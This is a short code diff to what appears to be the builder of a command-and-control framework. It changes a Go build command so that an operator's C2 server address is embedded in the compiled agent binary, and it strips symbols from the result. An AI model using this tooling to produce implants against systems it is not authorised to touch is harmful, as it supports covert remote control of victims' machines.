@@ -57,9 +57,21 @@ async function buildAgent() {
         buildLog.textContent += `[*] Output: ${path.basename(finalOutputPath)}\n\n`;
 
         // Build command
+        // Build command
         const agentDir = path.join(projectRoot, 'agent');
         let buildCmd = 'go';
-        let buildArgs = ['build', '-o', finalOutputPath];
+
+        // Clean C2 address (remove protocol if present)
+        let cleanC2Address = c2Address.replace(/^https?:\/\//, '');
+
+        // Embed C2 address into binary using ldflags
+        let buildArgs = [
+            'build',
+            '-ldflags',
+            `-s -w -X "main.embeddedC2Server=${cleanC2Address}"`,
+            '-o',
+            finalOutputPath
+        ];
 
         // Set environment variables for build
         const env = { ...process.env };
